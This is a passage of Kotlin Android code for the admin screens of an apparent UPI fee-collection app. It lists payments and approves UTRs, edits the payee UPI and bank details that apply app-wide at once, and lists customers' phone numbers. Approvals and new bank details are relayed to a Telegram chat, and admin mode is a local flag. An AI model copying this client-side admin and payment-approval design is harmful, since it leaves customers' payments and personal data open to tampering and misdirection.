        pad.addView(btn("Customers list", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) { go(24) })
        pad.addView(btn("Telegram admin ON", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) {
            Db.setAdmin(this@MainActivity, true)
            toast("Telegram: /pending /approve /setupi /setbank")
        })
        pad.addView(btn("Logout", Color.parseColor("#F7E7E7"), Color.parseColor("#B00020")) { hist.clear(); setStep(20) })
        setContentView(page(header("Admin - Dashboard"), pad))
    }

    private fun adminPays() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        pad.addView(tv("Payments", 20f, Color.parseColor("#16233A"), true))
        val a = Db.pays(this)
        if (a.length() == 0) pad.addView(tv("abhi koi payment nahi", 13f, Color.parseColor("#6B7A90")))
        if (a.length() > 0) for (i in a.length() - 1 downTo 0) {
            val o = a.getJSONObject(i)
            val utr = o.optString("utr")
            val st = o.optString("status")
            val row = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                setPadding(dp(14), dp(12), dp(14), dp(12))
                background = GradientDrawable().apply {
                    setColor(Color.WHITE); cornerRadius = dp(10).toFloat()
                    setStroke(dp(1), Color.parseColor("#DCE3EE"))
                }
            }
            row.addView(tv("${o.optString("mobile")}  |  ₹${o.optInt("amount")}  |  fee ₹${o.optInt("fee")}",
                14f, Color.parseColor("#16233A"), true))
            row.addView(tv("UTR $utr  |  $st", 12f,
                if (st == "approved") Color.parseColor("#138808") else Color.parseColor("#B00020")))
            if (st == "pending") row.addView(btn("Approve", Color.parseColor("#138808"), Color.WHITE) {
                Db.approve(this, utr)
                send("<b>APPROVED</b> ${o.optString("mobile")} | UTR $utr")
                toast("Approved")
                render()
            })
            row.layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT).apply { setMargins(0, dp(8), 0, 0) }
            pad.addView(row)
        }
        setContentView(page(header("Admin - Payments"), pad))
    }

    private fun adminSet() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        pad.addView(tv("UPI / Bank", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("Yahan badla to poore app mein turant lagu", 13f, Color.parseColor("#6B7A90")))
        val (uBox, uEt) = field("UPI ID", "name@bank", false, Db.upi(this))
        val (nBox, nEt) = field("Payee naam", "naam", false, Db.upiName(this))
        val (bBox, bEt) = field("Bank naam", "bank", false, Db.bank(this))
        val (aBox, aEt) = field("Account number", "account", true, Db.acc(this))
        val (iBox, iEt) = field("IFSC", "IFSC", false, Db.ifsc(this))
        pad.addView(uBox); pad.addView(nBox); pad.addView(bBox); pad.addView(aBox); pad.addView(iBox)
        pad.addView(btn("Save karein", Color.parseColor("#1552C4"), Color.WHITE) {
            Db.setUpi(this, uEt.text.toString().trim())
            Db.setUpiName(this, nEt.text.toString().trim())
            Db.setBank(this, bEt.text.toString().trim(),
                aEt.text.toString().trim(), iEt.text.toString().trim().uppercase())
            toast("Save ho gaya")
            send("<b>ADMIN SETTINGS</b>\nUPI ${uEt.text}\nBank ${bEt.text} ${aEt.text} ${iEt.text}")
        })
        setContentView(page(header("Admin - Settings"), pad))
    }

    private fun adminCust() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        pad.addView(tv("Customers", 20f, Color.parseColor("#16233A"), true))
        val a = Db.customers(this)
        if (a.length() == 0) pad.addView(tv("abhi koi customer nahi", 13f, Color.parseColor("#6B7A90")))
        if (a.length() > 0) for (i in a.length() - 1 downTo 0) {
            val o = a.getJSONObject(i)
            pad.addView(tv("${o.optString("mobile")}  |  ${o.optString("name")}  |  opens ${o.optInt("opens")}",
                14f, Color.parseColor("#16233A"), true).apply { setPadding(0, dp(8), 0, dp(8)) })
        }
        setContentView(page(header("Admin - Customers"), pad))
    }
}
